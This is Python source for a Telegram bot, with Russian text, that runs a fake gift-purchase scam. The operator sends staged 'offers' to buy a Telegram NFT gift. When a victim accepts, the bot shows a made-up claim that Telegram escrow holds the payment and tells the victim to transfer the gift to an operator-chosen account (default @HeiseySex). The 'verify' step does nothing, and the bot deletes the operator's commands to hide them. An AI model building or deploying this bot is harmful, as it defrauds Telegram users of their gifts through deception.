import os
import re
import json
import time
import threading
import requests
import telebot
import random
import string
from flask import Flask
from telebot.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InlineQueryResultArticle,
    InputTextMessageContent,
    ReplyKeyboardMarkup,
    KeyboardButton,
)

# ─────────────────────── НАСТРОЙКИ ───────────────────────

BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("❌ ОШИБКА: Переменная BOT_TOKEN не найдена!")

OWNER_ID = 861423393
VERIFY_TIMEOUT_SECONDS = 300
DB_FILE = "users_db.json"
OFFERS_FILE = "offers_db.json"

# ─────────────────────── ЭМОДЗИ ───────────────────────

EMOJI_STAR = "⭐"
EMOJI_GRAM = "💎"
EMOJI_GIFT = "🎁"
EMOJI_LOCK = "🔒"

# ─────────────────────── БАЗА ДАННЫХ ───────────────────────

def load_db(filename, default=None):
    if default is None: default = {}
    if os.path.exists(filename):
        try:
            with open(filename, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return default
    return default

def save_db(filename, data):
    try:
        with open(filename, "w", encoding="utf-8") as f:
            json.dump(data, f, ensure_ascii=False, indent=4)
    except Exception as e:
        print(f"[DB ERROR] {e}")

users_db = load_db(DB_FILE)
saved_offers = load_db(OFFERS_FILE)

def get_user_settings(user_id):
    uid = str(user_id)
    if uid not in users_db:
        users_db[uid] = {
            "target_url": "tg://send_gift?to=heiseysex",
            "target_nickname": "@HeiseySex",
            "escrow_template": (
                f"{EMOJI_LOCK} Пользователь зарезервировал <b>{{amount}}</b> {EMOJI_STAR} / {EMOJI_GRAM} через "
                "эксроу-систему Telegram. Средства хранятся на специальном "
                "эксроу-счёте и будут автоматически зачислены на ваш баланс "
                "сразу после передачи подарка.\n\n"
                "━━━━━━━━━━━━━━━━━━━━\n"
                "<b>Инструкция для завершения сделки:</b>\n\n"
                "1. Передайте подарок пользователю: <a href=\"{gift_url}\"><b>{nickname}</b></a>\n"
                "2. Нажмите «Передать NFT» и выберите <a href=\"{url}\">{name}</a>\n"
                "3. Подтвердите передачу подарка.\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Telegram зафиксирует транзакцию и моментально зачислит "
                "<b>{amount}</b> {EMOJI_STAR} / {EMOJI_GRAM} на ваш баланс."
            )
        }
        save_db(DB_FILE, users_db)
    return users_db[uid]

def generate_short_id():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))

# ─────────────────────── ИНИЦИАЛИЗАЦИЯ ───────────────────────

bot = telebot.TeleBot(BOT_TOKEN)
offers = {}
offers_lock = threading.Lock()
user_states = {}

# ─────────────────────── УТИЛИТЫ ───────────────────────

def normalize_url(raw):
    raw = raw.strip().strip('"').strip("'")
    if not raw: return ""
    if raw.startswith("@"): return f"https://t.me/{raw[1:]}"
    if raw.startswith(("http://", "https://", "tg://")): return raw
    if raw.startswith(("t.me/", "telegram.me/")): return f"https://{raw}"
    return f"https://t.me/{raw.lstrip('/')}"

def extract_name_from_url(url):
    match = re.search(r'/nft/([a-zA-Z]+)-(\d+)', url)
    if match:
        raw_name = match.group(1)
        numbers = match.group(2)
        name_with_spaces = re.sub(r'(?<!^)(?=[A-Z])', ' ', raw_name)
        return f"{name_with_spaces} #{numbers}"
    return "Подарок"

# НОВЫЙ УЛУЧШЕННЫЙ ПАРСЕР
def parse_offer_command(text):
    body = re.sub(r'^(/|\.)\s*(gift|offer|heisey|nft|сделка|buy)\s*', '', text, flags=re.IGNORECASE).strip()
    if not body: return None

    # Ищем ссылку в тексте
    url_match = re.search(r'(https?://\S+|t\.me/\S+|@\w+)', body)
    if not url_match:
        return None
        
    url_raw = url_match.group(1)
    url = normalize_url(url_raw)
    
    # Всё, что было до ссылки - это имя
    name_part = body[:url_match.start()].strip().strip('"').strip("'")
    # Всё, что было после ссылки - это сумма
    amount_part = body[url_match.end():].strip()
    
    # Очищаем сумму от букв (убираем stars, gram и тд)
    amount = re.sub(r'[^\d]', '', amount_part)
    
    # Если после ссылки цифр нет, ищем их в начале (например "100 stars t.me/...")
    if not amount:
        amount = re.sub(r'[^\d]', '', name_part)
        name_part = "" 
        
    if not amount:
        return None
        
    # Если имя не указано, вытаскиваем из ссылки
    if not name_part:
        name = extract_name_from_url(url)
    else:
        name = name_part
        
    return name, url, amount

# ─────────────────────── ТЕКСТЫ ───────────────────────

def build_offer_message(name, url, amount):
    return (
        f"{EMOJI_GIFT} Вам поступило предложение о покупке подарка.\n"
        "━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Пользователь предлагает вам <b>{amount}</b> {EMOJI_STAR} / {EMOJI_GRAM} за подарок "
        f"<a href=\"{url}\">{name}</a>.\n\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )

def build_offer_keyboard():
    keyboard = InlineKeyboardMarkup()
    keyboard.row(
        InlineKeyboardButton("Принять", callback_data="stage_accept"),
        InlineKeyboardButton("Отклонить", callback_data="stage_decline"),
    )
    return keyboard

def build_escrow_message(user_id, name, url, amount):
    settings = get_user_settings(user_id)
    template = settings.get("escrow_template")
    return template.format(
        gift_url=settings.get("target_url"),
        nickname=settings.get("target_nickname"),
        name=name,
        url=url,
        amount=amount
    )

def build_escrow_keyboard(user_id):
    settings = get_user_settings(user_id)
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("Передать подарок", url=settings.get("target_url")))
    keyboard.row(
        InlineKeyboardButton("Подтвердить", callback_data="stage_verify"),
        InlineKeyboardButton("Отменить", callback_data="stage_decline"),
    )
    return keyboard

# ─────────────────────── ОТПРАВКА ───────────────────────

def try_delete_message(chat_id, message_id, conn_id=None):
    try:
        if conn_id:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
            requests.post(url, json={"chat_id": chat_id, "message_id": message_id, "business_connection_id": conn_id}, timeout=10)
        else:
            bot.delete_message(chat_id, message_id)
    except Exception:
        pass

def safe_edit(chat_id, message_id, text, parse_mode="HTML", reply_markup=None, conn_id=None):
    kwargs = {"chat_id": chat_id, "message_id": message_id, "parse_mode": parse_mode}
    if reply_markup is not None: kwargs["reply_markup"] = reply_markup
    if conn_id: kwargs["business_connection_id"] = conn_id
    try:
        bot.edit_message_text(text, **kwargs)
        return True
    except Exception as e:
        print(f"[EDIT] {message_id}: {e}")
        return False

def send_business_message(chat_id, text, conn_id, reply_markup=None):
    kwargs = {"chat_id": chat_id, "text": text, "parse_mode": "HTML", "business_connection_id": conn_id}
    if reply_markup is not None: kwargs["reply_markup"] = reply_markup
    try:
        return bot.send_message(**kwargs)
    except Exception as e:
        print(f"[SEND] ОШИБКА: {e}")
        return None

# ─────────────────────── МЕНЮ НАСТРОЕК ───────────────────────

@bot.message_handler(commands=['start', 'settings'])
def cmd_start(message):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row(KeyboardButton("👤 Изменить ник"), KeyboardButton("🔗 Изменить ссылку"))
    kb.row(KeyboardButton("📝 Изменить текст"))
    bot.send_message(message.chat.id, "<b>Настройки профиля</b>\n\nЗдесь вы можете изменить данные для офферов.", parse_mode="HTML", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "👤 Изменить ник")
def set_nick_start(message):
    user_states[message.from_user.id] = "waiting_nick"
    bot.send_message(message.chat.id, "Введите новый юзернейм (например, @MyBestFriend):")

@bot.message_handler(func=lambda m: m.text == "🔗 Изменить ссылку")
def set_url_start(message):
    user_states[message.from_user.id] = "waiting_url"
    bot.send_message(message.chat.id, "Введите новую ссылку для кнопки (например, tg://send_gift?to=myfriend):")

@bot.message_handler(func=lambda m: m.text == "📝 Изменить текст")
def set_text_start(message):
    user_states[message.from_user.id] = "waiting_text"
    bot.send_message(message.chat.id, "Отправьте новый текст инструкции.\nДоступные переменные: <code>{gift_url}</code>, <code>{nickname}</code>, <code>{name}</code>, <code>{url}</code>, <code>{amount}</code>", parse_mode="HTML")

@bot.message_handler(func=lambda m: m.from_user.id in user_states, content_types=['text'])
def handle_settings_input(message):
    state = user_states.get(message.from_user.id)
    uid = str(message.from_user.id)
    settings = get_user_settings(message.from_user.id)
    
    if state == "waiting_nick": settings["target_nickname"] = message.text.strip()
    elif state == "waiting_url": settings["target_url"] = message.text.strip()
    elif state == "waiting_text": settings["escrow_template"] = message.text
    
    users_db[uid] = settings
    save_db(DB_FILE, users_db)
    del user_states[message.from_user.id]
    bot.send_message(message.chat.id, "✅ Настройки сохранены!", reply_markup=telebot.types.ReplyKeyboardRemove())

# ─────────────────────── BUSINESS-ОБРАБОТЧИК ───────────────────────

@bot.business_message_handler(func=lambda m: m.text is not None, content_types=["text"])
def handle_business_message(message):
    conn_id = message.business_connection_id
    sender_id = message.from_user.id
    if sender_id != OWNER_ID: return
    
    text_strip = message.text.strip()
    text_lower = text_strip.lower()
    
    # Вызов сохраненного оффера по ID
    match_call = re.match(r'^(/of|\.of|/оф|\.оф)\s+([a-z0-9]+)$', text_lower)
    if match_call:
        short_id = match_call.group(2)
        offer_data = saved_offers.get(short_id)
        
        try_delete_message(message.chat.id, message.message_id, conn_id)
        
        if not offer_data:
            send_business_message(message.chat.id, "❌ Оффер не найден.", conn_id)
            return
            
        name, url, amount = offer_data["name"], offer_data["url"], offer_data["amount"]
        sent = send_business_message(message.chat.id, build_offer_message(name, url, amount), conn_id, reply_markup=build_offer_keyboard())
        
        if sent:
            with offers_lock:
                offers[sent.message_id] = {
                    "name": name, "url": url, "amount": amount,
                    "finished": False, "conn_id": conn_id,
                    "chat_id": message.chat.id, "user_id": sender_id
                }
        return

    # Создание оффера (промокода)
    valid_prefixes = [
        "/gift", "/ gift", "/offer", "/ offer", ".offer", ". offer",
        "/heisey", "/ heisey", ".heisey", ". heisey", "/nft", "/ nft",
        ".nft", ". nft", "/сделка", "/ сделка", ".сделка", ". сделка",
        "/buy", "/ buy", ".buy", ". buy"
    ]
    
    if not any(text_lower.startswith(p) for p in valid_prefixes):
        return

    parsed = parse_offer_command(text_strip)
    if not parsed:
        send_business_message(
            message.chat.id, 
            "❌ Неверный формат.\n\n"
            "Используй: /gift ссылка 1200 stars", 
            conn_id
        )
        return

    name, url, amount = parsed
    short_id = generate_short_id()
    
    saved_offers[short_id] = {"name": name, "url": url, "amount": amount}
    save_db(OFFERS_FILE, saved_offers)
    
    try_delete_message(message.chat.id, message.message_id, conn_id)
    
    send_business_message(
        message.chat.id,
        f"✅ <b>Команда создана. Скопируй её и отправь в нужном чате:</b>\n\n"
        f"<code>/of {short_id}</code>",
        conn_id
    )

# ─────────────────────── INLINE-РЕЖИМ ───────────────────────

@bot.inline_handler(func=lambda q: True)
def handle_inline_query(query):
    raw = (query.query or "").strip()
    if query.from_user.id != OWNER_ID:
        bot.answer_inline_query(query.id, [InlineQueryResultArticle(id="d", title="Нет доступа", description="", input_message_content=InputTextMessageContent(message_text="Нет доступа"))], cache_time=0)
        return

    match_call = re.match(r'^(/of|\.of|/оф|\.оф)\s+([a-z0-9]+)$', raw.lower())
    if match_call:
        short_id = match_call.group(2)
        offer_data = saved_offers.get(short_id)
        
        if offer_data:
            name, url, amount = offer_data["name"], offer_data["url"], offer_data["amount"]
            results = [
                InlineQueryResultArticle(
                    id=f"offer_{short_id}",
                    title=f"🎁 {name} — {amount} ⭐",
                    description="Отправить сохраненный оффер",
                    input_message_content=InputTextMessageContent(message_text=build_offer_message(name, url, amount), parse_mode="HTML"),
                    reply_markup=build_offer_keyboard(),
                )
            ]
            bot.answer_inline_query(query.id, results, cache_time=0)
            return
        else:
            bot.answer_inline_query(query.id, [InlineQueryResultArticle(id="err", title="❌ Оффер не найден", description="", input_message_content=InputTextMessageContent(message_text="Оффер не найден"))], cache_time=0)
            return

    # Используем новый парсер и для инлайна
    name, url, amount = parse_offer_command(f"/gift {raw}")
    results = []

    if name and url and amount:
        results.append(
            InlineQueryResultArticle(
                id="offer_ready",
                title=f"🎁 {name} — {amount} ⭐",
                description=f"Отправить оффер",
                input_message_content=InputTextMessageContent(message_text=build_offer_message(name, url, amount), parse_mode="HTML"),
                reply_markup=build_offer_keyboard(),
            )
        )
    else:
        results.append(InlineQueryResultArticle(id="h", title="Формат", description="", input_message_content=InputTextMessageContent(message_text="Формат: @бот ссылка 100")))

    bot.answer_inline_query(query.id, results, cache_time=0)

# ─────────────────────── КНОПКИ ───────────────────────

@bot.callback_query_handler(func=lambda call: True)
def callback_router(call):
    payload = call.data
    conn_id = getattr(call.message, "business_connection_id", None)
    is_inline = (conn_id is None)
    offer_data = offers.get(call.message.message_id, {})
    target_user_id = offer_data.get("user_id", call.from_user.id)

    if payload == "stage_accept":
        text = call.message.html_text or call.message.text or ""
        m = re.search(r'<a href="([^"]+)">([^<]+)</a>', text)
        url = m.group(1) if m else "https://t.me"
        name = m.group(2) if m else "Подарок"
        m2 = re.search(r'<b>(\d+)</b>\s*', text)
        amount = m2.group(1) if m2 else "0"

        if is_inline:
            bot.answer_callback_query(call.id, text="Инструкция ниже 👇")
            try:
                bot.send_message(
                    chat_id=call.message.chat.id,
                    text=build_escrow_message(target_user_id, name, url, amount),
                    parse_mode="HTML",
                    reply_markup=build_escrow_keyboard(target_user_id),
                )
            except Exception as e:
                print(f"Ошибка: {e}")
        else:
            bot.answer_callback_query(call.id, text="Инструкция ниже.", show_alert=True)
            safe_edit(
                call.message.chat.id, call.message.message_id,
                build_escrow_message(target_user_id, name, url, amount),
                reply_markup=build_escrow_keyboard(target_user_id),
                conn_id=conn_id,
            )

    elif payload == "stage_verify":
        bot.answer_callback_query(call.id, text="Проверка запущена.")
        safe_edit(call.message.chat.id, call.message.message_id, "⏳ <b>Проверка...</b>", conn_id=conn_id)

    elif payload == "stage_decline":
        bot.answer_callback_query(call.id, text="Отклонено.")
        if is_inline:
            bot.send_message(call.message.chat.id, "❌ <b>Предложение отклонено.</b>", parse_mode="HTML")
        else:
            safe_edit(call.message.chat.id, call.message.message_id, "❌ <b>Предложение отклонено.</b>", conn_id=conn_id)

# ─────────────────────── ЗАПУСК ───────────────────────

app = Flask(__name__)

@app.route("/")
def index(): return "Bot is running"

def run_bot():
    print("✨ Бот запущен.")
    bot.infinity_polling(
        allowed_updates=["message", "callback_query", "inline_query", "business_connection", "business_message", "edited_business_message", "deleted_business_messages"],
        timeout=30,
    )

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
